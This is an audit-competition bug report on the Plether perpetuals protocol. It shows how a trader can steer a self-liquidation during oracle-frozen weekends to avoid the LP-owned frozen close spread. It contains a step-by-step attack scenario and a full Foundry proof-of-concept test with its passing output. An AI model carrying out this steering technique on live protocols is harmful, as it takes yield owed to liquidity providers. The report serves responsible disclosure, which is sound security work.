# \#97910 [SC-Medium] Oracle-frozen exits bypass the LP-owned frozen close spread through a steered self-liquidation

**Submitted on Nov 3rd 2026 at 21:14:29 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97910
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary  
  
When the oracle is frozen, the protocol charges a voluntary close a fixed spread (\`frozenCloseSpreadBps\`, 50 bps at launch) on the closed notional. That spread is the protocol's stated compensation to liquidity providers for letting a trader exit at a mark that can be up to 48 hours old. A liquidation in the same window exits at the same stored mark but is charged only the liquidation bounty (\`bountyBps\`, 10 bps), half of which is paid to whoever submits the liquidation.  
  
Because the stored mark cannot move while frozen, a position's liquidation equity becomes a deterministic function of time: it falls only through carry. \`addMargin\` is not gated by market status, so a trader can hold a position just above the frozen-window margin requirement for the whole weekend and keep a last-second choice between riding the reopen and exiting at the stale mark. Choosing to exit, the trader stops funding the position, lets carry cross the requirement within seconds, and liquidates its own account from a second address through the permissionless Router path. The exit lands at the same stored mark as a voluntary close while paying roughly one seventh of the charge. The difference is revenue the frozen-market design assigns to liquidity providers and does not collect, on exactly the flow the spread exists to price.  
  
## Severity  
  
Liquidity providers do not receive the frozen-close spread the protocol assigns them as the price of a stale-mark exit, and the trader taking the exit keeps that value. The spread is LP-owned and never protocol-treasury revenue, and it is mandatory: \`CfdEngine\` rejects a zero \`frozenCloseSpreadBps\` at construction and on every timelocked update (\`CfdEngine.sol:328\`, the parameter documented at \`CfdEngine.sol:287\` as the "nonzero LP-owned frozen-close spread"), so the protocol is configured never to let a frozen stale-mark exit occur without crediting this revenue to the pool. The steered self-liquidation takes exactly that exit while diverting the charge away from the pool and back to the trader, who retains it as higher residual equity plus the keeper credit paid to a second address under its control. The drain needs no privileged role, recurs on every frozen window (every weekend plus every governance-configured override day), and scales with position size and open interest. Deposited principal is not taken and the pool stays solvent, so the impact is theft of LP-owned unclaimed yield rather than a loss of deposited value; the Critical theft tier is not reached because it excludes unclaimed yield by its own terms.  
  
## Vulnerability details  
  
### The two frozen-market exit paths  
  
While \`oracleFrozen\` is active (every weekend from Friday 17:00 to Sunday 17:00 New York, and on override days), \`PletherOracle.\_frozenBasket\` replays the Engine's stored mark for every price mode, including liquidation:  
  
\`\`\`  
// packages/perps/src/PletherOracle.sol:729  
function \_frozenBasket(...) ... {  
    basket.price = engine.lastMarkPrice();                              // :733  stored Friday mark  
    ...  
    basket.confidence = basket.price \* basketMaxConfidenceRatioBps / 10\_000;  // :742  
}  
\`\`\`  
  
A voluntary close at that mark is charged the frozen spread on the closed notional:  
  
\`\`\`  
// packages/perps/src/libraries/CloseAccountingLib.sol:123  
state.frozenSpreadAssets = (notionalAssets \* inputs.frozenCloseSpreadBps) / 10\_000;  
\`\`\`  
  
A liquidation at the same mark is charged only the bounty, and no frozen spread or execution fee appears anywhere in the liquidation accounting:  
  
\`\`\`  
// packages/perps/src/libraries/LiquidationAccountingLib.sol:65  
uint256 liquidationChargeAssets = (notionalAssets \* bountyBps) / 10\_000;  
\`\`\`  
  
The charge is split by \`keeperShareBps\` (50% at launch) between the keeper and the protocol, and the residual equity returns to the liquidated account with its position margin fully unlocked:  
  
\`\`\`  
// packages/perps/src/libraries/CfdEnginePlanLib.sol:1531  
delta.residualAssets = delta.riskState.equityAssets - int256(delta.liquidationChargeAssets);  
delta.residualPlan.mutation.positionMarginUnlockedAssets = pos.margin;  // :1532  
\`\`\`  
  
### Root cause  
  
The liquidation path and the voluntary close path exit at the same stored mark during the freeze but price that exit differently, and nothing prevents an account owner from steering its own position across the liquidation threshold at a chosen second:  
  
1. \`PletherOracle.\_frozenBasket\` (\`src/PletherOracle.sol:729\`) replays the fixed stored mark for liquidation as well as for voluntary close, so both exit at the same price.  
2. \`CloseAccountingLib\` (\`src/libraries/CloseAccountingLib.sol:123\`) assesses \`frozenCloseSpreadBps\` only on the voluntary close; \`LiquidationAccountingLib\` (\`src/libraries/LiquidationAccountingLib.sol:65\`) assesses only \`bountyBps\` and never the frozen spread.  
3. \`CfdEnginePlanLib.planLiquidation\` (\`src/libraries/CfdEnginePlanLib.sol:1450\`) tests equity against \`fadMarginBps\` at that fixed price after projecting accrued carry, and makes no distinction between an involuntary crossing and a self-induced one.  
4. \`CfdEngine.addMargin\` (\`src/CfdEngine.sol:501\`) is gated only by \`msg.sender == account\`. It has no market-status check, so the owner can top the position up during the freeze and hold it a few cents above the requirement with second-level precision.  
5. \`OrderRouter.executeLiquidation\` (\`src/OrderRouter.sol:493\`) is permissionless and accepts empty Pyth data while frozen. Nothing prevents the account owner's second address from being the keeper that collects half the charge.  
  
Because the stored mark is fixed for the whole window, the only variable left in the liquidation-eligibility test is carry, which accrues each second against isolated margin once free settlement is zero. The owner therefore controls the exact moment of crossing and keeps the exit optional until the final seconds before the reopen.  
  
## Attack scenario  
  
1. Before the Friday pre-close FAD lead, the trader holds a 100,000-notional position, withdraws all free settlement, and tops up isolated margin so that equity sits just above 300 bps of notional at the worst live liquidation price through the lead.  
2. After the freeze begins, the trader makes minimal \`addMargin\` top-ups across the weekend. At no point is the account liquidatable by anyone.  
3. Shortly before the Sunday reopen, off-chain information indicates the reopen will gap against the position.  
4. The trader stops topping up. About 110 seconds of carry move equity below the FAD requirement at the unchanged stored mark.  
5. A second address controlled by the trader calls \`OrderRouter.executeLiquidation(trader, \[\])\`. The position closes at the stored Friday mark, the residual equity returns to the trader, and the second address receives 50% of the liquidation charge.  
6. Had the information instead been favorable, the trader would have made one more top-up at step 4 and ridden the position into the reopen. The cheap stale-mark exit is taken only on the adverse branch, which is the flow the frozen spread exists to charge.  
  
## Impact  
  
Liquidity providers do not receive the frozen close spread that the protocol assigns them as stale-mark compensation on weekend exits. In the proof of concept, on one 100,000-notional position, the pool is credited 77.57 USDG through the steered liquidation against 452.67 USDG through the documented voluntary close, a shortfall of 375.10 USDG per exit (about 37.5 bps of exited notional). The remaining 40 USDG of the trader's saving is the execution fee that the voluntary close pays to the treasury and the liquidation does not. The effect is available to any account, requires no privileged role, recurs on every frozen window (weekly weekends plus every configured override day), and concentrates on the most adverse flow, since the trader keeps the position open when the weekend news is favorable. Principal deposits are not taken; the documented price of a stale-mark exit is not enforced.  
  
## Relation to documented limitations and known issues  
  
The program treats the \`packages/perps/SECURITY.md\` Known Limitations and the three listed audit reports as known issues, and allows a report whose root cause is documented only where it shows that the fix at \`a82d4fef\` is incomplete or introduces a new bug. This finding clears that bar.  
  
What the documentation does cover is the fee asymmetry itself. \`SECURITY.md\` states that the frozen spread applies to "oracle-frozen voluntary closes only" (VPI limitations) and that "normal live and FAD-only closes apply signed VPI without that spread" (Oracle and market-closure limitations), and in Oracle regimes that "liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread," described as "a deliberate trade-off ... to preserve close and liquidation liveness during real closures."  
  
That trade-off is predicated on liquidation being an involuntary, insolvency-triggered mechanism: the stated intent is to keep forced liquidations alive during a real market closure, not to offer a solvent trader a discounted voluntary exit. The new bug is that three unprivileged, in-scope capabilities compose to convert that involuntary mechanism into a voluntary, self-timed, discounted exit, and none of the three is described anywhere as a limitation:  
  
1. \`CfdEngine.addMargin\` (\`src/CfdEngine.sol:501\`) has no market-status gate, so a solvent trader can hold a position a few cents above the frozen FAD requirement across the entire frozen window.  
2. At the fixed stored mark, liquidation eligibility is a deterministic, monotonic function of time through carry erosion alone, so the trader selects the exact second it becomes eligible.  
3. \`OrderRouter.executeLiquidation\` (\`src/OrderRouter.sol:493\`) is permissionless and the account's own second address may be the keeper, returning half the charge.  
  
The result is a repeatable, self-selected, adverse-selection drain of LP spread revenue: the trader exits through the liquidation path only when the weekend gaps against the position, and rides the reopen otherwise. The documentation accepts a liveness trade-off for forced liquidations; it does not state or accept that a trader can keep a solvent position at the FAD edge and self-liquidate on demand to avoid the LP spread. That steering, not the documented asymmetry, is the reported bug, and the proof of concept demonstrates it end to end.  
  
Against the three listed audit reports, no entry covers a steered self-liquidation spread bypass. The closest items are distinct in root cause: Cecuro MED-30 concerns stop-losses lacking an automatic frozen-market trigger; SC Audit Studio SC-M1 concerns frozen-window liquidations reverting on basket timestamp divergence; SC-M4 concerns a live 60-second dual-order free option; the AI scan's only frozen-liquidation item is the MED-7 component-divergence issue.



  
## References  
  
- \`packages/perps/src/PletherOracle.sol:729\` (\`\_frozenBasket\`, stored-mark replay for liquidation)  
- \`packages/perps/src/libraries/CloseAccountingLib.sol:123\` (frozen spread assessed on voluntary close)  
- \`packages/perps/src/libraries/LiquidationAccountingLib.sol:65\` (liquidation charge, no frozen spread)  
- \`packages/perps/src/libraries/CfdEnginePlanLib.sol:1450\` (FAD threshold test), \`:1531\` (residual equity returned to account)  
- \`packages/perps/src/CfdEngine.sol:501\` (\`addMargin\`, no market-status gate)  
- \`packages/perps/src/OrderRouter.sol:493\` (\`executeLiquidation\`, permissionless, empty Pyth data while frozen)  
- \`script/DeployPerpsArbitrumSepolia.s.sol\` (launch risk and oracle parameters)

## Proof of Concept

## Proof of concept


The test uses the repository fixture \`test/perps/BasePerpTest.sol\`, the real market calendar with no \`vm.mockCall\`, and the launch risk and oracle parameters from \`script/DeployPerpsArbitrumSepolia.s.sol\` (\`maintMarginBps\` 10, \`fadMarginBps\` 300, \`baseCarryBps\` 500, \`bountyBps\` 10, \`keeperShareBps\` 5000, \`adverseConfidenceMultiplierBps\` 2500, \`basketMaxConfidenceRatioBps\` 10, \`frozenCloseSpreadBps\` 50), which the test asserts in \`setUp\`.

Notes on the fixture, for the "no mocks" requirement:

- \`MockSettlementToken\` is the settlement asset. The Arbitrum Sepolia release deploys \`MockUSDG\`, an ordinary 6-decimal ERC20; both stand in for USDG and apply no custom logic.
- \`MockPyth\` is Pyth Network's canonical local price contract, used by the entire repository test suite. The production \`PletherOracle\` reads it through the real staleness, confidence-width, and divergence checks; no oracle response is faked.
- No \`vm.mockCall\` is used. Every value-moving action (open, voluntary close, both liquidations) is a public \`OrderRouter\` call. The weekend non-liquidatability checks use the real permissionless \`OrderRouter.executeLiquidation\`; the live pre-close checks use the engine's own canonical eligibility view \`CfdEngineLens.isLiquidatableAt\`.
- The \`vm.prank\` calls on the exploit path set \`msg.sender\` to externally owned addresses that any user controls: the trader's account and the trader's second address acting as keeper.

Both traders in the test run the same dead-man switch so that the only difference at the exit is the path taken. \`alice\` closes voluntarily; \`bob\` steers a self-liquidation. Their positions, margins, and timing are identical up to the decision.

File: \`packages/perps/test/bounty/run19/FrozenSelfLiquidationSpreadBypass.t.sol\`

\`\`\`solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// Oracle-frozen exits can bypass the LP-owned frozen close spread through a steered self-liquidation.
///
/// While the oracle is frozen (every weekend, Friday 17:00 to Sunday 17:00 New York) the stored mark cannot move,
/// so a position's liquidation equity is a deterministic function of time: it only falls through carry. addMargin
/// is not gated by market status, so a trader can hold a position a few cents above the frozen FAD requirement for
/// the whole weekend and keep a last-second choice between riding the reopen and exiting at the stale mark. The exit
/// through the permissionless liquidation path costs the 10 bps liquidation charge (half of which returns to the
/// trader's own keeper address) in place of the 50 bps LP spread plus 4 bps execution fee that a voluntary frozen
/// close pays. LPs receive the difference on neither path.
///
/// Every value-moving call runs through a public Router entry point (commitOrder, executeOrder, executeLiquidation)
/// with no vm.mockCall and no privileged role. The non-liquidatability checks use the engine's own canonical
/// eligibility view (CfdEngineLens.isLiquidatableAt); the weekend decision-point checks use the real permissionless
/// Router liquidation itself.
contract FrozenSelfLiquidationSpreadBypass is BasePerpTest {

    address alice = address(0xA11CE); // control: voluntary frozen close
    address bob = address(0xB0B); // steered self-liquidation
    address bobKeeper = address(0xB0B2); // bob's second address, acts as the keeper

    uint256 constant FRI = 1\_793\_923\_200; // Fri 2026-11-06 00:00 UTC (US standard time, freeze boundary 22:00 UTC)
    uint256 constant FRI\_2000 = FRI + 20 hours;
    uint256 constant FRI\_FROZEN = FRI + 22 hours;
    uint256 constant SUN\_OPEN = FRI + 2 days + 22 hours;
    uint256 constant SIZE = 100\_000e18;

    // Worst keeper-reachable price during the live FAD lead: stored mark 1.00 shifted adversely by the launch
    // confidence cap (basketMaxConfidenceRatioBps 10 x adverseConfidenceMultiplierBps 25% = 2.5 bps) against a long.
    uint256 constant WORST\_LIVE\_LIQ\_PRICE = 100\_025\_000;

    function \_riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function \_go(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// Public open: trader commits through the Router, keeper executes with a post-commit Pyth update at 1.00.
    function \_openAt1(address a, uint256 margin) internal {
        vm.prank(a);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, SIZE, margin, 0, false);
        bytes\[\] memory data = \_mockPythUpdateData(1e8);
        OrderV3Types.ExecutionResult memory r =
            router.executeOrder{value: pletherOracle.getOrderExecutionFee(data)}(id, data);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    function \_settlement(address a) internal view returns (uint256) {
        return clearinghouse.getAccountAssetBuckets(a).settlementBalanceAssets;
    }

    function \_wealth(address a) internal view returns (uint256) {
        return \_settlement(a) + settlementToken.balanceOf(a);
    }

    /// Is the account liquidatable right now, by anyone, at the current block timestamp?
    /// Frozen: the real permissionless Router path with empty Pyth data (stored-mark replay).
    /// Live FAD lead: the engine's canonical eligibility view at the worst keeper-reachable price. The view projects
    /// carry to block.timestamp, so it reflects the same erosion the real path would see.
    function \_liquidatableNow(address a) internal returns (bool ok) {
        if (engine.isOracleFrozen()) {
            uint256 snap = vm.snapshotState();
            vm.prank(bobKeeper);
            try router.executeLiquidation(a, new bytes\[\](0)) {
                (uint256 size,,,,,,) = engine.positions(a);
                ok = size == 0;
            } catch {}
            vm.revertToState(snap);
        } else {
            ok = engineLens.isLiquidatableAt(a, WORST\_LIVE\_LIQ\_PRICE, pool.totalAssets());
        }
    }

    /// Smallest wallet top-up (deposit + addMargin, now) that keeps the position non-liquidatable until \`probeTime\`.
    function \_tuneMargin(address a, uint256 probeTime) internal {
        uint256 lo = 0;
        uint256 hi = 1\_000e6;
        while (hi - lo &gt; 1) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            \_topUp(a, mid);
            \_go(probeTime);
            bool liq = \_liquidatableNow(a);
            vm.revertToState(snap);
            if (liq) lo = mid;
            else hi = mid;
        }
        \_topUp(a, hi);
    }

    function \_healthyAt(address a, uint256 t) internal returns (bool healthy) {
        uint256 snap = vm.snapshotState();
        \_go(t);
        healthy = !\_liquidatableNow(a);
        vm.revertToState(snap);
    }

    function \_topUp(address a, uint256 amt) internal {
        if (amt == 0) return;
        settlementToken.mint(a, amt);
        vm.startPrank(a);
        settlementToken.approve(address(clearinghouse), amt);
        clearinghouse.deposit(a, amt);
        engine.addMargin(a, amt);
        vm.stopPrank();
    }

    function \_withdrawAllFree(address a) internal {
        uint256 free = \_freeSettlementAssets(a);
        if (free == 0) return;
        vm.prank(a);
        clearinghouse.withdraw(a, free);
    }

    function setUp() public override {
        super.setUp();
        // Launch oracle policy: adverseConfidenceMultiplierBps = 2500 (DeployPerpsArbitrumSepolia.s.sol).
        IOrderRouterAdminHost.RouterConfig memory cfg = \_routerConfig();
        cfg.adverseConfidenceMultiplierBps = 2500;
        \_setRouterConfig(cfg);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10);
        assertEq(engine.frozenCloseSpreadBps(), 50);
    }

    /// Both traders run the same "dead-man switch": keep the position minimally above the FAD requirement with
    /// addMargin. At no point before the decision is either account liquidatable by anyone.
    function \_deadManSwitchUntilDecision(address a) internal {
        \_go(FRI\_FROZEN - 30 minutes - 1); // last pre-FAD second
        \_tuneMargin(a, FRI\_FROZEN - 5);
        assertTrue(\_healthyAt(a, FRI\_FROZEN - 30 minutes), "healthy at FAD start");
        assertTrue(\_healthyAt(a, FRI\_FROZEN - 5), "healthy at end of FAD lead");
    }

    function test\_FrozenSelfLiquidationBypassesFrozenSpread() public {
        // Friday 20:00 (normal regime): two identical 100k-notional longs at 1.00, 2.9% margin.
        \_go(FRI\_2000);
        \_fundTrader(alice, 3\_100e6);
        \_fundTrader(bob, 3\_100e6);
        \_openAt1(alice, 2\_900e6);
        \_openAt1(bob, 2\_900e6);
        \_withdrawAllFree(alice);
        \_withdrawAllFree(bob);

        \_deadManSwitchUntilDecision(alice);
        \_deadManSwitchUntilDecision(bob);

        // Final live mark of the week (FAD lead), unchanged price.
        \_go(FRI\_FROZEN - 10);
        {
            bytes\[\] memory data = \_mockPythUpdateData(1e8);
            router.updateMarkPrice{value: pletherOracle.getUpdateFee(data)}(data);
        }
        assertFalse(engine.isOracleFrozen(), "final mark installed live");

        // Weekend: periodic top-ups keep both just above the frozen FAD requirement at the fixed stored mark.
        \_go(FRI\_FROZEN + 10);
        assertTrue(engine.isOracleFrozen(), "frozen");
        \_tuneMargin(alice, FRI\_FROZEN + 1 days);
        \_tuneMargin(bob, FRI\_FROZEN + 1 days);
        assertTrue(\_healthyAt(bob, FRI\_FROZEN + 12 hours), "healthy Saturday");
        \_go(FRI\_FROZEN + 1 days);
        \_tuneMargin(alice, SUN\_OPEN - 120);
        \_tuneMargin(bob, SUN\_OPEN - 120);
        \_go(SUN\_OPEN - 120);
        assertTrue(engine.isOracleFrozen(), "still frozen at decision time");
        assertFalse(\_liquidatableNow(bob), "healthy at decision time");

        // Favourable-news branch (shown in a snapshot): Bob tops up again and stays open through the reopen.
        {
            uint256 snap = vm.snapshotState();
            \_tuneMargin(bob, SUN\_OPEN - 1);
            assertTrue(\_healthyAt(bob, SUN\_OPEN - 1), "bob can keep riding the position");
            vm.revertToState(snap);
        }

        // Adverse-news branch: both want out at the stale Friday mark.
        uint256 aliceBefore = \_wealth(alice);
        uint256 bobBefore = \_wealth(bob) + \_wealth(bobKeeper);
        uint256 poolBefore = pool.totalAssets();

        // The LP-owned spread a documented voluntary close would charge Bob at this same stored mark (50 bps of notional).
        uint256 spreadBobAvoids = engineLens.previewClose(bob, SIZE, 1e8).frozenSpreadAssets;
        emit log\_named\_uint("frozen-close spread Bob would owe LPs on a voluntary close", spreadBobAvoids);

        // Alice: documented frozen voluntary close (Router commit + permissionless execute, empty Pyth data).
        \_go(SUN\_OPEN - 15);
        vm.prank(alice);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        \_go(SUN\_OPEN - 10);
        {
            OrderV3Types.ExecutionResult memory r = router.executeOrder(closeId, new bytes\[\](0));
            emit log\_named\_uint("close status", uint256(r.status));
        }
        (uint256 aliceSize,,,,,,) = engine.positions(alice);
        assertEq(aliceSize, 0, "alice closed at the stored mark");
        uint256 poolMid = pool.totalAssets();

        // Bob: stops topping up; \~110 s of carry pushes him under the FAD requirement at the same stored mark, and
        // his second address liquidates him through the permissionless Router path.
        assertTrue(engine.isOracleFrozen(), "still frozen");
        vm.prank(bobKeeper);
        router.executeLiquidation(bob, new bytes\[\](0));
        (uint256 bobSize,,,,,,) = engine.positions(bob);
        assertEq(bobSize, 0, "bob exited at the stored mark");

        uint256 aliceCost = aliceBefore - \_wealth(alice);
        uint256 bobCost = bobBefore - (\_wealth(bob) + \_wealth(bobKeeper));
        uint256 aliceLpGain = poolMid - poolBefore;
        uint256 bobLpGain = pool.totalAssets() - poolMid;
        emit log\_named\_uint("alice frozen close cost (USDG 6dp)", aliceCost);
        emit log\_named\_uint("bob self-liquidation cost (USDG 6dp)", bobCost);
        emit log\_named\_uint("LP gain from alice close", aliceLpGain);
        emit log\_named\_uint("LP gain from bob liquidation", bobLpGain);
        emit log\_named\_uint("bob keeper credit", \_wealth(bobKeeper));

        // Both exits settle at the identical stale Friday mark; the only difference is the fee the chosen path assesses.
        assertEq(engine.lastMarkPrice(), 1e8, "both exits settle at the unchanged stored Friday mark");
        // The saving is specifically the avoided LP spread: Bob's entire exit costs less than the spread a voluntary
        // close would have charged him, and LPs receive far less than that spread from the liquidation path.
        assertApproxEqRel(spreadBobAvoids, 500e6, 0.05e18, "avoided spread is 50 bps of the 100k notional");
        assertLt(bobCost, spreadBobAvoids, "self-liquidation total cost is below the LP spread Bob avoided");
        assertGt(aliceLpGain - bobLpGain, spreadBobAvoids / 2, "LPs lose on the order of the frozen spread");
        assertLt(bobCost \* 4, aliceCost, "self-liquidation exit costs &lt; 1/4 of the frozen voluntary close");
    }
}
\`\`\`

Command:

\`\`\`
cd packages/perps &amp;&amp; forge test --match-path 'test/bounty/run19/FrozenSelfLiquidationSpreadBypass.t.sol' -vv
\`\`\`

Output:

\`\`\`
\[PASS\] test\_FrozenSelfLiquidationBypassesFrozenSpread() (gas: 114721227)
Logs:
  frozen-close spread Bob would owe LPs on a voluntary close: 500000000
  close status: 2
  alice frozen close cost (USDG 6dp): 492669916
  bob self-liquidation cost (USDG 6dp): 77570116
  LP gain from alice close: 452669916
  LP gain from bob liquidation: 77570116
  bob keeper credit: 50000000
\`\`\`

Reading the output: both accounts hold identical 100,000-notional positions with identical margin at the decision point, and neither is liquidatable by anyone before it, asserted during the live FAD lead and again at the weekend decision time. \`bob\` keeps a real choice at the decision, the favorable-news branch riding the position into the reopen and the adverse-news branch taking the cheap exit. \`alice\` exits through the documented voluntary frozen close at a cost of 492.669916 USDG and credits the pool 452.669916 USDG; \`bob\` exits at the same stored mark through the permissionless liquidation at a cost of 77.570116 USDG, credits the pool 77.570116 USDG, and 50.0 USDG of the charge returns to his own second address. The pool therefore receives 375.099800 USDG less from \`bob\`'s exit than from the equivalent voluntary close. The saving is the avoided LP spread rather than VPI or carry: both exits settle at the identical unchanged stored mark (\`lastMarkPrice == 1e8\`), the frozen-close spread a voluntary close would charge \`bob\` is exactly 500.0 USDG (50 bps of the 100,000 notional), and \`bob\`'s entire self-liquidation exit costs 77.57 USDG, below that spread alone.
